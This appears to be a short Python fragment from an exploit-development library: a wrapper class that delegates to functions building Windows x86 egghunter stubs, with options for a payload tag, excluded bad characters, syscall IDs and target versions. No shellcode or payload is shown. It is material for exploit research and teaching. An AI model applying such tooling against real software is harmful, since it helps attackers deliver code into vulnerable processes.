class Egghunters:
    """Backwards-compatible class wrapper around the module API."""

    @classmethod
    def specs(cls) -> dict[HunterKind, HunterSpec]:
        return specs()

    @staticmethod
    def egg(tag: bytes = b"W00T") -> bytes:
        return build_egg(tag)

    @classmethod
    def build(
        cls,
        kind: HunterKind,
        tag: bytes = b"W00T",
        *,
        isbadreadptr_addr: int | None = None,
        excluded: bytes | Iterable[int] = b"",
        syscall_id: int | None = None,
        target: str = "win10_x86",
    ) -> BuildResult:
        return build(
            kind=kind,
            tag=tag,
            excluded=excluded,
            syscall_id=syscall_id,
            isbadreadptr_addr=isbadreadptr_addr,
            target=target,
        )
